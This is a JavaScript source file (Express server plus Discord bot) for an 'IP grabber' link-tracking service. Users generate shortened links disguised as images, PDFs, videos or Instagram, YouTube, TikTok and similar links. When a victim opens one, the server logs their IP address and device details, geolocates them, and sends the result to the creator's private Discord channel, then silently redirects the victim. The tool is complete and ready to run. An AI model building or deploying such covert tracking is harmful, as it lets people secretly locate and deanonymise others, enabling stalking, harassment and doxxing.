require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const cors = require('cors');
const DeviceDetector = require('device-detector-js');
const {
  Client,
  GatewayIntentBits,
  Partials,
  Events,
  ButtonBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ButtonStyle,
  ChannelType,
  PermissionsBitField,
  EmbedBuilder
} = require('discord.js');

const app = express();
app.use(cors());

const port = process.env.PORT || 3000;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const TINYURL_API_TOKEN = process.env.TINYURL_API_TOKEN;
const TRACKER_BASE_URL = process.env.TRACKER_BASE_URL;
const CLIENTS_FILE = './clients.json';
const deviceDetector = new DeviceDetector();

let lookup;
const maxmind = require('maxmind');
(async () => {
  lookup = await maxmind.open('./GeoLite2-City.mmdb');
})();
async function shortenUrl(url) {
  try {
    const response = await axios.post('https://api.tinyurl.com/create', {
      url: url
    }, {
      headers: {
        Authorization: `Bearer ${TINYURL_API_TOKEN}`,
        'Content-Type': 'application/json'
      }
    });
    return response.data.data.tiny_url;
  } catch (error) {
    console.error('Erreur TinyURL :', error.response?.data || error.message);
    return null;
  }
}

// Routes Express
app.get('/:type', async (req, res) => {
  const { type } = req.params;
  const u = req.query.u;
  if (!u) return res.redirect('https://google.com');

  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const userAgent = req.headers['user-agent'];
  const device = deviceDetector.parse(userAgent);

  const geo = lookup.get(ip) || {};

  const embed = new EmbedBuilder()
    .setTitle('📥 Nouvelle connexion détectée')
    .setDescription(`**IP :** \`${ip}\`\n**Appareil :** ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}`)
    .setColor(0x00AE86)
    .setTimestamp();

  try {
    if (fs.existsSync(CLIENTS_FILE)) {
      const clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
      const channelId = clients[u];
      if (channelId) {
        await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, {
          embeds: [embed]
        }, {
          headers: {
            Authorization: `Bot ${DISCORD_TOKEN}`,
            'Content-Type': 'application/json'
          }
        });
      }
    }
  } catch (err) {
    console.error("Erreur Discord:", err.message);
  }

  // Redirections simples
  if (['instagram', 'youtube', 'tiktok', 'facebook', 'x', 'discord'].includes(type)) {
    let url = `https://${type}.com`;
    if (type === 'x') url = `https://x.com`;
    return res.redirect(url);
  }

  res.status(204).send(); // image, pdf, video
});
app.listen(port, () => {
  console.log(`🚀 Serveur Express actif sur le port ${port}`);
});

// Discord Bot
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
  partials: [Partials.Channel]
});

client.once(Events.ClientReady, () => {
  console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);
});

client.on(Events.InteractionCreate, async interaction => {
  if (interaction.isButton() && interaction.customId === 'generate_tracker') {
    await interaction.deferReply({ ephemeral: true });

    const guild = interaction.guild;
    const user = interaction.user;
    const shortId = crypto.randomBytes(3).toString("hex");
    const channelName = `🔗・mon-lien-tracker-${shortId}`;

    const privateChannel = await guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: guild.roles.everyone, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory], deny: [
          PermissionsBitField.Flags.SendMessages,
          PermissionsBitField.Flags.AttachFiles,
          PermissionsBitField.Flags.EmbedLinks,
          PermissionsBitField.Flags.MentionEveryone,
          PermissionsBitField.Flags.AddReactions
        ] },
        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.EmbedLinks, PermissionsBitField.Flags.AttachFiles, PermissionsBitField.Flags.ManageChannels] }
      ]
    });

    const select = new StringSelectMenuBuilder()
      .setCustomId('select_tracker_type')
      .setPlaceholder('Choisis ton type de lien')
      .addOptions(
        { label: 'Image (.jpg)', value: 'image.jpg', emoji: '📸' },
        { label: 'Document (.pdf)', value: 'document.pdf', emoji: '📄' },
        { label: 'Vidéo (.mp4)', value: 'video.mp4', emoji: '🎥' },
        { label: 'Instagram', value: 'instagram', emoji: '🌐' },
        { label: 'YouTube', value: 'youtube', emoji: '🌐' },
        { label: 'TikTok', value: 'tiktok', emoji: '🌐' },
        { label: 'Facebook', value: 'facebook', emoji: '🌐' },
        { label: 'Twitter (X)', value: 'x', emoji: '🌐' },
        { label: 'Discord', value: 'discord', emoji: '🌐' }
      );

    const row = new ActionRowBuilder().addComponents(select);

    await privateChannel.send({
      content: `🔍 Choisis le type de lien que tu veux générer :`,
      components: [row]
    });

    const uniqueId = `${user.id}_${shortId}`;
    let clients = {};
    if (fs.existsSync(CLIENTS_FILE)) {
      clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
    }

    clients[uniqueId] = privateChannel.id;
    fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));

    await interaction.editReply({
      content: `✅ Ton salon privé est prêt : <#${privateChannel.id}>`,
      ephemeral: true
    });
  }
});
client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'select_tracker_type') return;

  const guild = interaction.guild;
  const user = interaction.user;
  const channel = interaction.channel;
  const selection = interaction.values[0];

  const shortId = crypto.randomBytes(3).toString("hex");
  const uniqueId = `${user.id}_${shortId}`;

  let generatedUrl = `${TRACKER_BASE_URL}/${selection}?u=${uniqueId}`;

  const shortLink = await shortenUrl(generatedUrl);

  if (!shortLink) {
    await channel.send(`❌ Impossible de raccourcir ton lien. Voici le lien brut :\n${generatedUrl}`);
  } else {
    await channel.send(`✅ Ton lien est prêt :\n${shortLink}`);
  }

  let clients = {};
  if (fs.existsSync(CLIENTS_FILE)) {
    clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
  }

  clients[uniqueId] = channel.id;
  fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
});

client.login(DISCORD_TOKEN);
